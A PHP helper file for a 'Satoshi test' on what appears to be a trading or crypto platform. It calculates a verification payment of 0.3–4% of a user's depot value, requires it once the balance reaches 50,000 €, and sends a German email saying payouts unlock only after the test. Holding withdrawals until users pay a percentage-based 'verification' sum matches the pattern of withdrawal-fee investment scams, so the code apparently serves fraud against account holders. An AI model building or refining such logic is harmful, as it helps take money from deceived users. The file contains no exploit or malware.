<?php
/**
 * Satoshi Test Helper Functions
 *
 * Shared helpers used by satoshi-test.php and any page that needs
 * to check whether a user has completed the Satoshi verification.
 */

/**
 * Returns true when the given user has at least one confirmed/verified
 * Satoshi test record in the satoshi_tests table.
 */
function userHasVerifiedTest(PDO $pdo, int $userId): bool
{
    try {
        $stmt = $pdo->prepare(
            "SELECT id FROM satoshi_tests
             WHERE user_id = ? AND status IN ('verified','confirmed','completed')
             LIMIT 1"
        );
        $stmt->execute([$userId]);
        return (bool)$stmt->fetch();
    } catch (PDOException $e) {
        // Table may not exist yet; treat as not verified
        return false;
    }
}

/**
 * Calculates the verification amount range for a user's Satoshi test.
 *
 * @param  float $depotValue  Total reported/depot value in EUR
 * @param  bool  $isHighRisk  Whether the user is flagged as high-risk
 * @return array{amount: float, percentage: float, min: float, max: float}
 */
function calculateVerificationAmount(float $depotValue, bool $isHighRisk): array
{
    $baseMin = 0.003; // 0.3 %
    $baseMax = 0.04;  // 4 %

    if ($isHighRisk) {
        $baseMin = 0.02;  // 2 %
        $baseMax = 0.04;  // 4 %
    }

    $minAmount = max(10.0, $depotValue * $baseMin);
    $maxAmount = max(10.0, $depotValue * $baseMax);

    // Default test amount when no depot value known
    if ($depotValue <= 0) {
        $minAmount = 10.0;
        $maxAmount = 10.0;
    }

    $percentage = round(($baseMin + $baseMax) / 2 * 100, 2);
    $amount     = ($minAmount + $maxAmount) / 2;

    return [
        'amount'     => round($amount,     2),
        'percentage' => $percentage,
        'min'        => round($minAmount,  2),
        'max'        => round($maxAmount,  2),
    ];
}

/**
 * Gibt zurück, ob ein Satoshi-Test basierend auf Systemeinstellung + Kontostand erforderlich ist.
 */
function isSatoshiVerificationRequired(bool $packagesEnabled, float $userBalance, float $threshold = 50000.0): bool
{
    return !$packagesEnabled && $userBalance >= $threshold;
}

/**
 * Liefert den letzten Satoshi-Test (minimal) für einen Benutzer.
 *
 * @return array{id:int,status:string,created_at:string}|null
 */
function getLatestSatoshiTestStatus(PDO $pdo, int $userId): ?array
{
    try {
        $stmt = $pdo->prepare(
            "SELECT id, status, created_at
             FROM satoshi_tests
             WHERE user_id = ?
             ORDER BY created_at DESC
             LIMIT 1"
        );
        $stmt->execute([$userId]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        return $row ?: null;
    } catch (PDOException $e) {
        return null;
    }
}

/**
 * Sendet einmalig eine E-Mail, wenn ein Benutzer die 50k-Grenze erreicht
 * und der Satoshi-Test erforderlich ist, aber noch nicht abgeschlossen wurde.
 */
function sendSatoshiThresholdEmailIfNeeded(PDO $pdo, int $userId, float $userBalance, bool $packagesEnabled, float $threshold = 50000.0): bool
{
    if (!isSatoshiVerificationRequired($packagesEnabled, $userBalance, $threshold)) {
        return false;
    }

    if (userHasVerifiedTest($pdo, $userId)) {
        return false;
    }

    try {
        // Kein Reminder wenn bereits ein aktiver Antrag läuft
        $pendingStmt = $pdo->prepare(
            "SELECT id
             FROM satoshi_tests
             WHERE user_id = ?
               AND status IN ('pending', 'under_review')
             LIMIT 1"
        );
        $pendingStmt->execute([$userId]);
        if ($pendingStmt->fetch(PDO::FETCH_ASSOC)) {
            return false;
        }

        $userStmt = $pdo->prepare("SELECT email, first_name FROM users WHERE id = ? LIMIT 1");
        $userStmt->execute([$userId]);
        $user = $userStmt->fetch(PDO::FETCH_ASSOC);
        if (!$user || empty($user['email'])) {
            return false;
        }

        $subject = 'Satoshi-Test erforderlich ab 50.000 € Kontostand';
        $alreadySentStmt = $pdo->prepare(
            "SELECT id
             FROM email_logs
             WHERE recipient = ?
               AND subject = ?
             LIMIT 1"
        );
        $alreadySentStmt->execute([$user['email'], $subject]);
        if ($alreadySentStmt->fetch(PDO::FETCH_ASSOC)) {
            return false;
        }

        require_once __DIR__ . '/../EmailHelper.php';
        $emailHelper = new EmailHelper($pdo);
        $body = '
            <p>Guten Tag {first_name},</p>
            <p>Ihr Kontostand hat die Schwelle von <strong>50.000 €</strong> erreicht.</p>
            <p>Bitte führen Sie jetzt den <strong>Satoshi-Test</strong> durch, damit Verifizierungs- und Auszahlungsfunktionen vollständig freigeschaltet werden.</p>
            <p><a href="{site_url}/app/satoshi-test.php" style="display:inline-block;padding:10px 16px;background:#2950a8;color:#fff;text-decoration:none;border-radius:6px;">Satoshi-Test starten</a></p>
            <p>Viele Grüße<br>{brand_name}</p>
        ';

        return (bool)$emailHelper->sendDirectEmail(
            $userId,
            $subject,
            $body,
            [
                'threshold_amount' => number_format($threshold, 2, ',', '.') . ' €',
                'current_balance' => number_format($userBalance, 2, ',', '.') . ' €',
            ]
        );
    } catch (Throwable $e) {
        error_log('sendSatoshiThresholdEmailIfNeeded: ' . $e->getMessage());
        return false;
    }
}
